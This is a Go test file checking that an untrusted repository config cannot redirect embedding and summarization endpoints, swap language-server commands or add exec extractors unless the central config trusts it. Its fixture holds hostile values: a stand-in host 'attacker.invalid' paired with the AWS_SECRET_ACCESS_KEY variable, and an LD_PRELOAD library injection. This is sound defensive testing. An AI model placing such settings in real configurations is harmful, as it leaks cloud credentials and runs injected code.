package config

import (
	"strings"
	"testing"
)

// hostileRepo is a repo file that tries every dangerous knob: a language server
// command with args and env, an exec extractor, a redirected embed endpoint
// with another API-key variable, and a redirected summarize provider.
const hostileRepo = `{
  "trust_repo_config": true,
  "repos": {"@ROOT@": {"trust_repo_config": true}},
  "embed": {"provider":"openai","base_url":"http://attacker.invalid/v1","model":"evil","api_key_env":"AWS_SECRET_ACCESS_KEY","enabled":true},
  "summarize": {"provider":"openai","base_url":"http://attacker.invalid/v1","model":"evil","api_key_env":"AWS_SECRET_ACCESS_KEY","enabled":true},
  "languages": {
    "go": {"command":"evil-ls","args":["--x"],"env":{"LD_PRELOAD":"/tmp/x.so"},"extensions":[".go"]},
    "zz": {"extensions":[".zz"],"extractor":"evilx"}
  },
  "extractors": {"evilx": {"type":"exec","argv":["evil-extract","{listFile}"],"version_argv":["evil-extract","version"]}}
}`

const hostileCentral = `{"embed":{"provider":"ollama","base_url":"http://127.0.0.1:11434","model":"central-model","api_key_env":"CENTRAL_KEY"},
  "summarize":{"provider":"ollama","base_url":"http://127.0.0.1:11434","model":"central-sum"},
  "languages":{"go":{"command":"gopls","extensions":[".go"]}}`

func TestHostileRepoConfigIsInertUnlessTrustedCentrally(t *testing.T) {
	// Untrusted: the central file does not set trust_repo_config.
	cp, root := layeredSetup(t, hostileCentral+`}`, hostileRepo)
	c, _, notes, err := LoadLayered(cp, root, env(nil))
	if err != nil {
		t.Fatal(err)
	}
	if c.TrustRepoConfig {
		t.Fatal("repo file set its own trust")
	}
	if c.Embed.BaseURL != "http://127.0.0.1:11434" || c.Embed.APIKeyEnv != "CENTRAL_KEY" || c.Embed.Model != "central-model" {
		t.Errorf("embed was redirected: %+v", c.Embed)
	}
	if c.Summarize.BaseURL != "http://127.0.0.1:11434" || c.Summarize.APIKeyEnv != "" || c.Summarize.Model != "central-sum" {
		t.Errorf("summarize was redirected: %+v", c.Summarize)
	}
	if _, ok := c.Extractors["evilx"]; ok {
		t.Error("repo extractor was accepted")
	}
	if got := c.ExtractorsFor("zz"); len(got) != 0 {
		t.Errorf("repo extractor resolvable through its language: %+v", got)
	}
	r := c.Resolved()
	for name, ne := range r.usedExtractors() {
		argv := strings.Join(ne.Argv, " ")
		if strings.Contains(argv, "evil") {
			t.Errorf("extractor %s carries a repo command: %s", name, argv)
		}
	}
	goLang := r.Languages["go"]
	if goLang.Command != "gopls" || len(goLang.Args) != 0 || len(goLang.Env) != 0 {
		t.Errorf("language command/args/env taken from the repo: %+v", goLang)
	}
	for _, ne := range c.ExtractorsFor("go") {
		if strings.Contains(strings.Join(ne.Argv, " "), "evil") || len(ne.Env) != 0 {
			t.Errorf("go extractor carries repo command or env: %+v", ne)
		}
	}
	for _, want := range []string{"ignored embed", "ignored summarize", "ignored extractors.evilx", "ignored languages.go.command", "ignored languages.go.env", "ignored trust_repo_config"} {
		if !strings.Contains(joined(notes), want) {
			t.Errorf("notes lack %q:\n%s", want, joined(notes))
		}
	}

	// Trusted: only the central file's repos entry turns the repo file on.
	cp, root = layeredSetup(t, hostileCentral+`,"repos":{"@ROOT@":{"trust_repo_config":true}}}`, hostileRepo)
	c, _, notes, err = LoadLayered(cp, root, env(nil))
	if err != nil {
		t.Fatal(err)
	}
	if !c.TrustRepoConfig {
		t.Fatal("central trust not applied")
	}
	for _, n := range notes {
		if !strings.Contains(n, "ignored repos") && !strings.Contains(n, "ignored trust_repo_config") {
			t.Errorf("trusted repo lost something: %s", n)
		}
	}
	if c.Embed.BaseURL != "http://attacker.invalid/v1" || c.Embed.APIKeyEnv != "AWS_SECRET_ACCESS_KEY" {
		t.Errorf("trusted embed not applied: %+v", c.Embed)
	}
	if c.Summarize.BaseURL != "http://attacker.invalid/v1" {
		t.Errorf("trusted summarize not applied: %+v", c.Summarize)
	}
	if e := c.Extractors["evilx"]; len(e.Argv) == 0 || e.Argv[0] != "evil-extract" {
		t.Errorf("trusted extractor not applied: %+v", e)
	}
	if l := c.Languages["go"]; l.Command != "evil-ls" || l.Env["LD_PRELOAD"] == "" {
		t.Errorf("trusted language command/env not applied: %+v", l)
	}
}

// trust_repo_config is accepted from the central file only inside a repos entry.
func TestTrustFlagOnlyFromCentralReposEntry(t *testing.T) {
	cp, root := layeredSetup(t, `{"trust_repo_config":true}`, "")
	if _, _, _, err := LoadLayered(cp, root, env(nil)); err == nil || !strings.Contains(err.Error(), "only allowed inside a repos entry") {
		t.Errorf("top-level trust_repo_config: err = %v", err)
	}
}
